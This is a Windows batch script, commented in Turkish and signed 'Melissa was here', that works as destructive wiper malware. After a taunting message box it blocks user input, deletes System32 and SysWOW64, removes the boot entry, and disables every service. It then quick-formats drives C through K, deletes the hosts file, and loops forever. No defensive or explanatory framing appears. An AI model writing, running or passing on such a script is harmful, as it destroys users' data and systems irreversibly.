@echo off
:: Tüm sistem çökertiliyor... Melissa etkisini hissettiriyor! 😈
echo Melissa başlıyor... Eğlenmeye hazır mısınız?

:: Yönetici Yetkisi Kontrolü
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Yönetici olarak çalıştırmanız gerekiyor!
    pause
    exit
)

:: Fare ve Klavye Kontrolünü Devre Dışı Bırak
echo Fare ve klavye kontrolü kapatılıyor... Artık sadece izleyebilirsiniz!
rundll32.exe user32.dll,BlockInput TRUE

:: Büyük Ekran Mesajı
echo Büyük bir veda mesajı gösteriliyor...
powershell -command "& {Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('SEE YOU LATER BABY 😈\nSYS: SLAWEALLY')}"

:: Melissa'nın Gülücüklerini Göster
echo Melissa gülücük sıçratmaya başlıyor...
for /l %%x in (1,1,50) do (
    powershell -command "Write-Host '😀😂😈 Melissa was here! Iteration: %%x' -ForegroundColor Red"
    timeout /t 1 >nul
)

:: Kritik Sistem Dosyalarını ve Klasörlerini Silme
echo System32 ve SysWOW64 hedef alınıyor...
takeown /f C:\Windows\System32 /r /d y >nul 2>&1
icacls C:\Windows\System32 /grant %username%:F /t >nul 2>&1
rd /s /q C:\Windows\System32

takeown /f C:\Windows\SysWOW64 /r /d y >nul 2>&1
icacls C:\Windows\SysWOW64 /grant %username%:F /t >nul 2>&1
rd /s /q C:\Windows\SysWOW64

:: Bootloader Sabotajı
echo Bootloader siliniyor... Windows bir daha açılmayacak!
bcdedit /delete {current} /f >nul 2>&1

:: Kritik Hizmetleri Durdurma
echo Tüm hizmetler durduruluyor... Windows hayatta kalamayacak!
for /f "tokens=*" %%a in ('sc query state^= all ^| findstr "SERVICE_NAME"') do (
    sc stop %%a >nul 2>&1
    sc config %%a start= disabled >nul 2>&1
)

:: Tüm Diskleri Biçimlendirme
echo Tüm diskler biçimlendiriliyor... Artık verileriniz yok!
for %%x in (C D E F G H I J K) do (
    echo Y | format %%x: /FS:NTFS /Q >nul 2>&1
)

:: Hosts Dosyasını Manipüle Etme
echo Hosts dosyası yok ediliyor... İnternet erişimi kesiliyor!
takeown /f C:\Windows\System32\drivers\etc\hosts >nul 2>&1
icacls C:\Windows\System32\drivers\etc\hosts /grant %username%:F >nul 2>&1
del /f /q C:\Windows\System32\drivers\etc\hosts

:: Melissa'nın Son Notu
echo Melissa, son bir mesaj bırakıyor...
echo "SEE YOU LATER BABY 😈\nSYS: SLAWEALLY\nMelissa was here!" >> C:\melissa_legacy.txt

:: Sonsuz Döngü (CPU Tüketimi)
:start
echo Windows kilitleniyor... Melissa kazandı! 😀😂😈
goto start

:: Sistem Kapatma
echo Windows kapanıyor... Eğlenceniz sona erdi!
shutdown /s /f /t 0
